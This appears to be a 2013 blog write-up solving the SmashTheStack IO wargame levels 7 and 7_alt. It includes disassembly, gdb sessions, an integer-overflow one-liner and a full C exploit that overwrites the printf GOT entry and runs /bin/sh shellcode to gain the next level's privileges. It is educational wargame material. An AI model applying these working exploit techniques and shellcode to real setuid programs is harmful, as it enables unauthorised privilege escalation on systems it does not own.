---
layout: post
title: "Levels 7 and 7_alt - IO at STS"
date: 2013-08-15 13:51
comments: true
categories: [SmashTheStack-IO, Security]
---

I've been documenting my experiences with [IO][] at [SmashTheStack][] for a while, but decided not to post them publicly for a few reasons. However level 7 (in particular the `alt` level) was the first that I thought worthy of posting. This post includes how I broke both applications to make it through to the level 8. If you haven't had a play on the [SmashTheStack][] wargames yet, I really do recommend it. They're great fun.

<!--more-->

Spoiler Alert
-------------

This post covers, in detail, how to get past level 7 and level 7 alt. If you haven't done these levels yourself yet, and you plan to, then please don't read this until you've nailed them yourself. I'd hate for this to ruin your experience.

However, if you've done the level or you're just interested in what's involved, please read on.

Connecting
----------

Fire up a shell and connect to the game server with the password for the `level7` user (I won't be sharing passwords here).

{% codeblock lang:bash %}
$ ssh level7@io.smashthestack.org
{% endcodeblock %}

Let's see what challenges there are for us:

{% codeblock lang:bash %}
level7@io:~$ ls /levels/level07*
/levels/level07  /levels/level07_alt  /levels/level07_alt.c  /levels/level07.c
{% endcodeblock %}

This level has two possible entry points, and we'll be covering both in this post.

Level 07
--------

We start by looking at the source of the target program:

{% codeblock level07.c lang:c %}
//written by bla
#include <stdio.h>
#include <string.h>
#include <unistd.h>

int main(int argc, char **argv)
{
        int count = atoi(argv[1]);
        int buf[10];

        if(count >= 10 ) 
                return 1;

        memcpy(buf, argv[2], count * sizeof(int));

        if(count == 0x574f4c46) {
                printf("WIN!\n");
                execl("/bin/sh", "sh" ,NULL);
        } else
                printf("Not today son\n");

        return 0;
}
{% endcodeblock %}

What's clear here is that we need to pass a number in that is less than `10`, but is big enough to allow us to overflow `buf` so that we can modify the value of `count`. The data that's written to `buf` is only allowed to be `count * sizeof(int)` in size.  We can easily pass in numbers smaller than 10, but they won't be big enough to overflow `buf`. If we pass in a _negative_ number we bypass the check, but the call to `memcpy` will fail because `count * sizeof(int)` is negative.

We need to find a way of turning this calculation into something positive, but also much bigger than `10 * sizeof(int)` so that we can overflow `buf`.

What's interesting about this is that `sizeof(int)` on a 32-bit machine is `4`, which is effectively a `SHL 2` operation. We can confirm this by disassembling `main` and looking at the generated output:

{% codeblock lang:bash %}
gdb$ disas main
Dump of assembler code for function main:
0x08048414 <main+0>:    push   ebp
0x08048415 <main+1>:    mov    ebp,esp
0x08048417 <main+3>:    sub    esp,0x68
0x0804841a <main+6>:    and    esp,0xfffffff0
0x0804841d <main+9>:    mov    eax,0x0
0x08048422 <main+14>:   sub    esp,eax
0x08048424 <main+16>:   mov    eax,DWORD PTR [ebp+0xc]
0x08048427 <main+19>:   add    eax,0x4
0x0804842a <main+22>:   mov    eax,DWORD PTR [eax]
0x0804842c <main+24>:   mov    DWORD PTR [esp],eax
0x0804842f <main+27>:   call   0x8048354 <atoi@plt>
0x08048434 <main+32>:   mov    DWORD PTR [ebp-0xc],eax
0x08048437 <main+35>:   cmp    DWORD PTR [ebp-0xc],0x9
0x0804843b <main+39>:   jle    0x8048446 <main+50>
0x0804843d <main+41>:   mov    DWORD PTR [ebp-0x4c],0x1
0x08048444 <main+48>:   jmp    0x80484ad <main+153>
0x08048446 <main+50>:   mov    eax,DWORD PTR [ebp-0xc]
0x08048449 <main+53>:   shl    eax,0x2                          <- here
0x0804844c <main+56>:   mov    DWORD PTR [esp+0x8],eax
0x08048450 <main+60>:   mov    eax,DWORD PTR [ebp+0xc]
0x08048453 <main+63>:   add    eax,0x8
0x08048456 <main+66>:   mov    eax,DWORD PTR [eax]
0x08048458 <main+68>:   mov    DWORD PTR [esp+0x4],eax
0x0804845c <main+72>:   lea    eax,[ebp-0x48]
0x0804845f <main+75>:   mov    DWORD PTR [esp],eax
0x08048462 <main+78>:   call   0x8048334 <memcpy@plt>
0x08048467 <main+83>:   cmp    DWORD PTR [ebp-0xc],0x574f4c46
0x0804846e <main+90>:   jne    0x804849a <main+134>
0x08048470 <main+92>:   mov    DWORD PTR [esp],0x8048584
0x08048477 <main+99>:   call   0x8048344 <printf@plt>
0x0804847c <main+104>:  mov    DWORD PTR [esp+0x8],0x0
0x08048484 <main+112>:  mov    DWORD PTR [esp+0x4],0x804858a
0x0804848c <main+120>:  mov    DWORD PTR [esp],0x804858d
0x08048493 <main+127>:  call   0x8048324 <execl@plt>
0x08048498 <main+132>:  jmp    0x80484a6 <main+146>
0x0804849a <main+134>:  mov    DWORD PTR [esp],0x8048595
0x080484a1 <main+141>:  call   0x8048344 <printf@plt>
0x080484a6 <main+146>:  mov    DWORD PTR [ebp-0x4c],0x0
0x080484ad <main+153>:  mov    eax,DWORD PTR [ebp-0x4c]
0x080484b0 <main+156>:  leave  
0x080484b1 <main+157>:  ret    
End of assembler dump.
{% endcodeblock %}

Some investigation of the behaviour of this instruction lead me to realise that there was room for abuse when values over/underflow. If we use `SHL` with numbers of a small enough negative value, those values become positive. Let's have a look at that in action by whipping up a sample program and viewing the output:

{% codeblock Testing Shifts Source lang:c %}
int main(int argc, char **argv)
{
    int x = -2147483647;
    printf("%p\n", x);
    printf("%p\n", x << 2);
    printf("%p\n", (x + 16) << 2);
    printf("%p\n", (x + 32) << 2);
    return 0;
}
{% endcodeblock %}

Compile this code with `gcc` and run it, and you'll find the following:

{% codeblock Testing Shifts lang:bash %}
level7@io:/tmp/tc7$ ./a.out
0x80000001
0x4
0x44
0x84
{% endcodeblock %}

So we can pass in a negative integer, have it shift and turn it into a positive that's big enough to overflow the buffer. Once we've overflowed, all we need to do is write the value `0x574f4c46` to the desired memory location and the level will pass. We can get smart and figure out exactly where this needs to be, or we can go with the approach of repeatedly writing it knowing that somewhere along the line it'll end up being written to where we need it to be: in the `count` varaible. I chose to do the latter. We pass this data in as the second argument on the command line. Let's see how this looks:

{% codeblock Exploit Run lang:bash %}
level7@io:$ /levels/level07 -2147483600 `perl -e 'print "\x46\x4c\x4f\x57" x 100'`
WIN!
sh-4.1$ cat /home/level8/.pass
<< -- password was printed here -- >>
{% endcodeblock %}

This level was relatively simple, but was good exposure to the idea of how integer underflows can cause problems.

Level 07 alt
------------

Let's start with the source of the alternate application, modified a little by me (and highlighted):

{% codeblock level07_alt.c lang:c %}
/* 
    Coding by LarsH

    PJYN GIEZIRC FRD RBNE OM QNML PE ZMP PJM BMPPMI AIMHQMDFYMN AIEC R PMUP,
    this program can also be used to get the letter frequencies from a text  <-- I added this
    TJYFJ JMBGN TJMD FIRFWYDZ NPRDLRIL CEDENQONPYPQPYED FYGJMIN.
    which helps when cracking standard monosubstitution ciphers              <-- I added this

*/

#include <stdio.h>

static int count[256];

int main(int argc, char **argv) {

    int i, j;

    if(argc == 1) {
        printf("Usage: %s words\n", argv[0]);
        return 1;
    }

    /* Clear out the frequency buffer */
    for(i=0; i<256; i++)
        count[i] = 0;

    /* Fill the frequency buffer */
    for(j=1; argv[j]; j++)
        for(i=0; argv[j][i]; i++)
            count[argv[j][i]]++;

    /* Print out the frequency buffer */
    for(i=0; i<256; i++)
        if(count[i])
            printf("%c found %i time%s\n", i, count[i], count[i]-1?"s":"");

    return 0;
}
{% endcodeblock %}

On the surface it's hard to see where this application could be attacked! It's one of those bit of code that seems rather non-descript, yes has a very subtle issue in it which will allow us to gain some form of control. The obvious thing to look for is where memory is modified as a result of our user input, and this leads us to the following line:

{% codeblock lang:c %}
count[argv[j][i]]++;
{% endcodeblock %}

Here the code is using the `j`th word (passed in on the command line via `argv`) and accessing its `i`th character, then using this character as an index into `count` to increment the count for that letter. The application is obviously doing a simple letter-tally. Straight up this looks like a potential point of attack because the values in `argv` are _signed_ characters, and hence we can pass in values that are **negative** and write outside the bounds of the `count` array. Let's `objdump` the binary to see where `count` lives:

{% codeblock lang:bash %}
$ objdump -D /levels/level07_alt | grep count
08049720 <count>:
{% endcodeblock %}

The negative values we can use are from `CHAR_MIN` (`-128`) &times; `sizeof(int)` (`4` on a 32-bit system) to `0`. So with `count` located at `0x8049720`, it means we can write values from here, all the way back to `0x8049520`. Let's see what fits within this range, again by looking at the output of `objdump`:

{% codeblock lang:bash %}
$ objdump -D /levels/level07_alt
... snip ...

Disassembly of section .ctors:

080495ec <__CTOR_LIST__>:
 80495ec:	ff                   	(bad)  
 80495ed:	ff                   	(bad)  
 80495ee:	ff                   	(bad)  
 80495ef:	ff 00                	incl   (%eax)

080495f0 <__CTOR_END__>:
 80495f0:	00 00                	add    %al,(%eax)
  ...

Disassembly of section .dtors:

080495f4 <__DTOR_LIST__>:
 80495f4:	ff                   	(bad)  
 80495f5:	ff                   	(bad)  
 80495f6:	ff                   	(bad)  
 80495f7:	ff 00                	incl   (%eax)

080495f8 <__DTOR_END__>:
 80495f8:	00 00                	add    %al,(%eax)
  ...

Disassembly of section .jcr:

080495fc <__JCR_END__>:
 80495fc:	00 00                	add    %al,(%eax)
  ...

Disassembly of section .dynamic:

08049600 <_DYNAMIC>:
 8049600:	01 00                	add    %eax,(%eax)
 8049602:	00 00                	add    %al,(%eax)
 8049604:	10 00                	adc    %al,(%eax)
 8049606:	00 00                	add    %al,(%eax)
 8049608:	0c 00                	or     $0x0,%al
 804960a:	00 00                	add    %al,(%eax)
 804960c:	78 82                	js     8049590 <__FRAME_END__+0xfa8>
 804960e:	04 08                	add    $0x8,%al
 8049610:	0d 00 00 00 9c       	or     $0x9c000000,%eax
 8049615:	85 04 08             	test   %eax,(%eax,%ecx,1)
 8049618:	04 00                	add    $0x0,%al
 804961a:	00 00                	add    %al,(%eax)
 804961c:	48                   	dec    %eax
 804961d:	81 04 08 f5 fe ff 6f 	addl   $0x6ffffef5,(%eax,%ecx,1)
 8049624:	70 81                	jo     80495a7 <__FRAME_END__+0xfbf>
 8049626:	04 08                	add    $0x8,%al
 8049628:	05 00 00 00 e0       	add    $0xe0000000,%eax
 804962d:	81 04 08 06 00 00 00 	addl   $0x6,(%eax,%ecx,1)
 8049634:	90                   	nop
 8049635:	81 04 08 0a 00 00 00 	addl   $0xa,(%eax,%ecx,1)
 804963c:	4c                   	dec    %esp
 804963d:	00 00                	add    %al,(%eax)
 804963f:	00 0b                	add    %cl,(%ebx)
 8049641:	00 00                	add    %al,(%eax)
 8049643:	00 10                	add    %dl,(%eax)
 8049645:	00 00                	add    %al,(%eax)
 8049647:	00 15 00 00 00 00    	add    %dl,0x0
 804964d:	00 00                	add    %al,(%eax)
 804964f:	00 03                	add    %al,(%ebx)
 8049651:	00 00                	add    %al,(%eax)
 8049653:	00 d4                	add    %dl,%ah
 8049655:	96                   	xchg   %eax,%esi
 8049656:	04 08                	add    $0x8,%al
 8049658:	02 00                	add    (%eax),%al
 804965a:	00 00                	add    %al,(%eax)
 804965c:	18 00                	sbb    %al,(%eax)
 804965e:	00 00                	add    %al,(%eax)
 8049660:	14 00                	adc    $0x0,%al
 8049662:	00 00                	add    %al,(%eax)
 8049664:	11 00                	adc    %eax,(%eax)
 8049666:	00 00                	add    %al,(%eax)
 8049668:	17                   	pop    %ss
 8049669:	00 00                	add    %al,(%eax)
 804966b:	00 60 82             	add    %ah,-0x7e(%eax)
 804966e:	04 08                	add    $0x8,%al
 8049670:	11 00                	adc    %eax,(%eax)
 8049672:	00 00                	add    %al,(%eax)
 8049674:	58                   	pop    %eax
 8049675:	82                   	(bad)  
 8049676:	04 08                	add    $0x8,%al
 8049678:	12 00                	adc    (%eax),%al
 804967a:	00 00                	add    %al,(%eax)
 804967c:	08 00                	or     %al,(%eax)
 804967e:	00 00                	add    %al,(%eax)
 8049680:	13 00                	adc    (%eax),%eax
 8049682:	00 00                	add    %al,(%eax)
 8049684:	08 00                	or     %al,(%eax)
 8049686:	00 00                	add    %al,(%eax)
 8049688:	fe                   	(bad)  
 8049689:	ff                   	(bad)  
 804968a:	ff 6f 38             	ljmp   *0x38(%edi)
 804968d:	82                   	(bad)  
 804968e:	04 08                	add    $0x8,%al
 8049690:	ff                   	(bad)  
 8049691:	ff                   	(bad)  
 8049692:	ff 6f 01             	ljmp   *0x1(%edi)
 8049695:	00 00                	add    %al,(%eax)
 8049697:	00 f0                	add    %dh,%al
 8049699:	ff                   	(bad)  
 804969a:	ff 6f 2c             	ljmp   *0x2c(%edi)
 804969d:	82                   	(bad)  
 804969e:	04 08                	add    $0x8,%al
  ...

Disassembly of section .got:

080496d0 <.got>:
 80496d0:	00 00                	add    %al,(%eax)
  ...

Disassembly of section .got.plt:

080496d4 <_GLOBAL_OFFSET_TABLE_>:
 80496d4:	00 96 04 08 00 00    	add    %dl,0x804(%esi)
 80496da:	00 00                	add    %al,(%eax)
 80496dc:	00 00                	add    %al,(%eax)
 80496de:	00 00                	add    %al,(%eax)
 80496e0:	be 82 04 08 ce       	mov    $0xce080482,%esi
 80496e5:	82                   	(bad)  
 80496e6:	04 08                	add    $0x8,%al
 80496e8:	de                   	.byte 0xde
 80496e9:	82                   	(bad)  
 80496ea:	04 08                	add    $0x8,%al

Disassembly of section .data:

080496ec <__data_start>:
 80496ec:	00 00                	add    %al,(%eax)
  ...

080496f0 <__dso_handle>:
 80496f0:	00 00                	add    %al,(%eax)
  ...

Disassembly of section .bss:

08049700 <completed.5706>:
 8049700:	00 00                	add    %al,(%eax)
  ...

08049704 <dtor_idx.5708>:
  ...

08049720 <count>:
  ...
... snip ...
{% endcodeblock %}

As you can see, there area a few sections that we can write to:

* The [.ctors][] section is in range, but this isn't going to help us because the code executed in constructors is executed before our code gets to execute.
* The [.dtors][] section is in range, hence we might be able to write something to this section which would get executed when the program exits.
* The [GOT][] is in range, so perhaps we can look into overwriting a `GOT` entry with something else that will help us compromise the application.

Let's take a look at what's in the `GOT`:

{% codeblock lang:bash %}
$ objdump --dynamic-reloc /levels/level07_alt

/levels/level07_alt:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
080496d0 R_386_GLOB_DAT    __gmon_start__
080496e0 R_386_JUMP_SLOT   __gmon_start__
080496e4 R_386_JUMP_SLOT   __libc_start_main
080496e8 R_386_JUMP_SLOT   printf
{% endcodeblock %}

Here we can see 5 entries. The first three are all executed prior to the body of the program, hence they're not really options for attack. The last one, `printf`, looks promising because this doesn't get invoked until _after_ all of the input characters have been passed in. We have the opportunity to rewrite this value to point somewhere else. If we fire this up in `gdb` and take a look at the value that's stored in this location just before the `printf` call we find that the value is `0x080482de`. Here's a (tidied) snapshot from `gdb`:

{% codeblock lang:bash %}
gdb$ x/128x 0x8049520
0x8049520           : 0x0cec8300      0xfffd4fe8      0x18bb8dff      0x8dffffff
0x8049530           : 0xffff1883      0xc1c729ff      0xff8502ff      0xf6312474
0x8049540           : 0x8910458b      0x8b082444      0x44890c45      0x458b0424
0x8049550           : 0x24048908      0x18b394ff      0x83ffffff      0xfe3901c6
0x8049560           : 0xc483de72      0x5f5e5b0c      0x1c8bc35d      0x9090c324
0x8049570           : 0x53e58955      0xa104ec83      0x080495ec      0x74fff883
0x8049580           : 0x95ecbb13      0x90660804      0xff04eb83      0x83038bd0
0x8049590           : 0xf475fff8      0x5b04c483      0x9090c35d      0x53e58955
0x80495a0           : 0xe804ec83      0x00000000      0x2cc3815b      0xe8000011
0x80495b0           : 0xfffffd6c      0xc3c95b59      0x00000003      0x00020001
0x80495c0           : 0x67617355      0x25203a65      0x6f772073      0x0a736472
0x80495d0           : 0x00007300      0x66206325      0x646e756f      0x20692520
0x80495e0           : 0x656d6974      0x000a7325      0x00000000      0xffffffff
0x80495f0 <CTE>     : 0x00000000      0xffffffff      0x00000000      0x00000000
0x8049600 <DYN>     : 0x00000001      0x00000010      0x0000000c      0x08048278
0x8049610 <DYN+16>  : 0x0000000d      0x0804859c      0x00000004      0x08048148
0x8049620 <DYN+32>  : 0x6ffffef5      0x08048170      0x00000005      0x080481e0
0x8049630 <DYN+48>  : 0x00000006      0x08048190      0x0000000a      0x0000004c
0x8049640 <DYN+64>  : 0x0000000b      0x00000010      0x00000015      0xb7fff8e0
0x8049650 <DYN+80>  : 0x00000003      0x080496d4      0x00000002      0x00000018
0x8049660 <DYN+96>  : 0x00000014      0x00000011      0x00000017      0x08048260
0x8049670 <DYN+112> : 0x00000011      0x08048258      0x00000012      0x00000008
0x8049680 <DYN+128> : 0x00000013      0x00000008      0x6ffffffe      0x08048238
0x8049690 <DYN+144> : 0x6fffffff      0x00000001      0x6ffffff0      0x0804822c
0x80496a0 <DYN+160> : 0x00000000      0x00000000      0x00000000      0x00000000
0x80496b0 <DYN+176> : 0x00000000      0x00000000      0x00000000      0x00000000
0x80496c0 <DYN+192> : 0x00000000      0x00000000      0x00000000      0x00000000
0x80496d0           : 0x00000000      0x08049600      0xb7fff8f8      0xb7ff65f0
0x80496e0 <GOT+12>  : 0x080482be      0xb7ea9bc0      0x080482de      0x00000000  <-- just here
0x80496f0 <DSO>     : 0x00000000      0x00000000      0x00000000      0x00000000
0x8049700           : 0x00000000      0x00000000      0x00000000      0x00000000
0x8049710           : 0x00000000      0x00000000      0x00000000      0x00000000
{% endcodeblock %}

Where:

* `CTE` -> CTOR END
* `DYN` -> DYNAMIC
* `GOT` -> GLOBAL OFFSET TABLE
* `DSO` -> DSO HANDLE

Remember that the application only allows us to increment existing values one at a time for every "index" (ie. character) that is passed on the command line. As a result, this value is what we have to add start with, and any address we want to point to has to come after this. Unfortunately for us, there is a limitation on the command line which prevents us from passing in any more than 128k characters. This is going to bite us in the butt later on.

We need to be able to point this address to an area of memory that we control. It'd be great if we could point this straight at `argv`, but we can't do that. Why? Because:

1. The `count` array is an array of 32-bit integers. This means we can only increment whole **word** values, we can't increment individual _bytes_.
1. Areas of memory that we control, such as `argv[N]`, are in the high address ranges (think something like `o0xbffff___`). To increment a word value from the `printf` source value to a value like this, or even another value on the stack, we would need to increment that value too many times. We don't have the command-line character budget to be able to do that.

This means that if we want to point the entry to something we control, we're going to have to point it to `count` +/- 128 words. This comes with its own set of issues:

* Within this range we would need to craft our own instructions that get executed, using nothing but incrementing values.
* Realistically, we can only write to the lower 2 bytes of each 4-byte word. If we attempt to write higher we either blow our budget or waste too many characters on a single instruction.
* The area of memory that we know we have control over that has predictable values prior to our code running is the intended storage area for the `count` array and at the start of the program that entire area is set to `zero`.
* To my knowledge, there's no `GETROOT` instruction in x86 assembly, nor are there any instructions less than 3 bytes in size that can do something useful without other instructions working alongside them. This means writing multiple instructions to memory.
* If we can only modify the lower 2 bytes, then the higher 2 bytes will remain `00 00`. Given that Intel x86 is little endian, this means that after our instructions those zero bytes will always be executed before our next instruction does.
* The opcode `00 00` translates to `MOV [EAX], AL`, which means "take the value of the lower-order byte in `EAX` and store it in the location pointed to by `EAX`". This means we can't really use `EAX` for something useful because the code will attempt to write back to areas of memory that we are interested in, probably clobbering code or pointers that are important.

Let's take a look at the state of `EAX` at the time the `printf` function is called:

{% codeblock lang:bash %}
(gdb) break *0x080484d3
Breakpoint 1 at 0x80484d3
(gdb) run abcd
Starting program: /levels/level07_alt abcd

Breakpoint 1, 0x080484d3 in main ()
(gdb) info registers
eax            0x61	97
ecx            0xbffffcb0	-1073742672
edx            0x80485d1	134514129
ebx            0xb7fd1ff4	-1208147980
esp            0xbffffc60	0xbffffc60
ebp            0xbffffc98	0xbffffc98
esi            0x0	0
edi            0x0	0
eip            0x80484d3	0x80484d3 <main+303>
eflags         0x206	[ PF IF ]
cs             0x23	35
ss             0x2b	43
ds             0x2b	43
es             0x2b	43
fs             0x0	0
gs             0x63	99
{% endcodeblock %}

What's interesting is that `EAX` contains the value `0x61`, which is ASCII for `a`. This happens to be the first character we pass in on the command line. As a result, we do have _some_ control over `EAX` at this point, but not enough to allow us to point to a valid location. Unfortunately, if we are to allow the execution of `MOV [EAX], AL`, we can't let `EAX` contain a value like `0x00000061`, as writing to this area will cause an access violation. We're going to have to change this value to a valid pointer.

Also, take a look at `ECX`, as it's value looks to be in a memory area that we have control over. It turns out that `ECX` contains a pointer to `argc`, the number of arguments passed to the program on the command line. What's great about this, is that `argv` immediately follows it. That is, `argv` is located at `ECX+4`. Here we can see the start of a possible attack vector.

To get `ECX` to point to `argv[0]` and execute, we'd need to do the following (ASM with opcodes):

    INC ECX          41
    INC ECX          41
    INC ECX          41
    INC ECX          41
    MOV ECX, [ECX]   8B 09
    JMP [ECX]        FF 21

This code increments `ECX` by `4`, then jumps to the address that is stored in the value `ECX` points to. This looks fine, but why can't we do this? Firstly, we can't have the instructions all close together like this. To write these values to the `count` array, we'd have to suffer the pain of having the double zero bytes in the way, like so:

    INC ECX          41
    INC ECX          41
    MOV [EAX], AL    00 00
    INC ECX          41
    INC ECX          41
    MOV [EAX], AL    00 00
    MOV ECX, [ECX]   8B 09
    MOV [EAX], AL    00 00
    JMP [ECX]        FF 21

This is made worse by the fact that `EAX` contains a crap address. Given that we don't really care about the content of `ECX` which is just a counter of arguments passed to the program, we can overwrite `EAX` with `ECX` resulting in a valid pointer that references an address we don't really care about. Each time the double-null instruction is executed, a 1-byte value will be written over the top of `argc`. No more crash!

    MOV EAX, ECX     89 C8
    MOV [EAX], AL    00 00
    INC ECX          41
    INC ECX          41
    MOV [EAX], AL    00 00
    INC ECX          41
    INC ECX          41
    MOV [EAX], AL    00 00
    MOV ECX, [ECX]   8B 09
    MOV [EAX], AL    00 00
    JMP [ECX]        FF 21

Therefore somewhere in `count` we need to write these values so that the memory looks like this (little-endian remember!):

    0x0000C889 0x00004141 0x00004141 0x0000098B 0x000021FF

Wherever we write this value, we need to know the location so that we can increment the `printf` `GOT` entry so that it points to the start of this code. Great, we're well underway then, right?

Wrong, there is still one more issue. If this code runs successfully, then `EIP` should point directly at `argv[0]`; that is, it'll point at the string which contains the name of the program that was executed, `/levels/level07_alt`. This isn't exactly usable shellcode that is going to give us what we need. However, there is a way around this. In C, we can use the `execl()` function to invoke another binary, and specify _all_ of the arguments _including_ `argv[0]`. As a result, we can write some shellcode and use this for `argv[0]` instead of the program name.

So with all this in mind, below is the full source to the exploit (rather verbose, but it's on purpose) in C:

{% codeblock Exploit Source lang:c %}
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

static const char* target = "/levels/level07_alt";
static const char* shellcode =
"\x31\xc0\xb0\x46\x31\xdb\x31\xc9"
"\xcd\x80\xeb\x16\x5b\x31\xc0\x88"
"\x43\x07\x89\x5b\x08\x89\x43\x0c"
"\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c"
"\xcd\x80\xe8\xe5\xff\xff\xff\x2f"
"\x62\x69\x6e\x2f\x73\x68\x58\x41"
"\x41\x41\x41\x42\x42\x42\x42\x90";

// this is the address of the count array in memory
static const unsigned int countAddress = 0x08049720;

// address of the printf GOT entry
static const unsigned int printfAddress = 0x80496e8;
// initial value of the printf GOT entry
static const unsigned int printfValue = 0x080482de;

// The index into the count array which stores the first
// instruction which will be executed when the program
// attempts to print out the results.
static const unsigned int instructionStartIndex = 0x34;

// there are all the opcodes we need to write to
// the count array (in little-endian order)
static const unsigned int movEaxEcx = 0xC889;
static const unsigned int incIncEcx = 0x4141;
static const unsigned int movEcxEcx = 0x98B;
static const unsigned int jmpEcx = 0x21FF;

// Helper function which gives us the index into the count
// array that we would need in order to write a value to the
// given targetAddress.
unsigned int getIndex(unsigned int targetAddress)
{
  if (targetAddress < countAddress)
  {
    return 0x100 - (countAddress - targetAddress >> 2);
  }

  return (targetAddress - countAddress) >> 2;
}

// Helper function which takes a buffer, a value, and a counter and will
// repeatedly write the value to the buffer until the appropriate number of
// writes has happened. It'll return a pointer to the memory location
// which immediately follows where it finished off.
unsigned char* repeat(unsigned char* destination, unsigned char value, int count)
{
  int i;

  for (i = 0; i < count; ++i)
  {
    *destination++ = value;
  }

  return destination;
}

int main()
{
  // calculate some offets and indexes
  unsigned int startInstructionAddress = instructionStartIndex * 4 + countAddress;
  unsigned int printfIndex = getIndex(printfAddress);
  unsigned int printfInc = startInstructionAddress - printfValue;
  unsigned int argBufSize = printfInc + movEaxEcx + incIncEcx * 2 + movEcxEcx + jmpEcx;

  unsigned char* cursor;

  // allocate some memory for our command line arguments and null terminate it
  unsigned char* argBuf = (unsigned char*)malloc(argBufSize + 1);
  argBuf[argBufSize] = 0;

  // start by writing data required to point the printf entry to our location
  // in the count array that contains our instructions
  cursor = repeat(argBuf, printfIndex, printfInc);
  // then write all our opcodes
  cursor = repeat(cursor, instructionStartIndex, movEaxEcx);
  cursor = repeat(cursor, instructionStartIndex + 1, incIncEcx);
  cursor = repeat(cursor, instructionStartIndex + 2, incIncEcx);
  cursor = repeat(cursor, instructionStartIndex + 3, movEcxEcx);
  repeat(cursor, instructionStartIndex + 4, jmpEcx);

  printf("Attempting to exploit, good luck!\n");
  // finally invoke the program, passing in the shell code and
  // making sure that EAX contains 8 at the right time.
  execl(target, shellcode, "\x08", argBuf, (char*)0);

  free(argBuf);

  return EXIT_SUCCESS;
}
{% endcodeblock %}

Upload, compile and run the exploit and this is what happens:

{% codeblock Exploit Run lang:bash %}
level7@io:/tmp/.oj$ ./sploit
Attempting to exploit, good luck!
sh-4.2$ id
uid=1007(level7) gid=1007(level7) euid=1008(level8) groups=1008(level8),1007(level7),1029(nosu)
sh-4.2$ cat /home/level8/.pass
<< -- password was printed here -- >>
{% endcodeblock %}

Game over! What a great challenge that was.

I'd like to point out that this alternate level took me a _very long time_ to nail. It was well worth the effort, and I learned a stack in the process.

Feedback is appreciated as always. Thanks for reading.

  [IO]: http://io.smashthestack.org:84/ "IO @ Smash The Stack"
  [SmashTheStack]: http://smashthestack.org/ "Smash The Stack"
  [.ctors]: http://gcc.gnu.org/onlinedocs/gccint/Initialization.html
  [.dtors]: http://gcc.gnu.org/onlinedocs/gccint/Initialization.html
  [GOT]: http://bottomupcs.sourceforge.net/csbu/x3824.htm "Global Offset Tables"
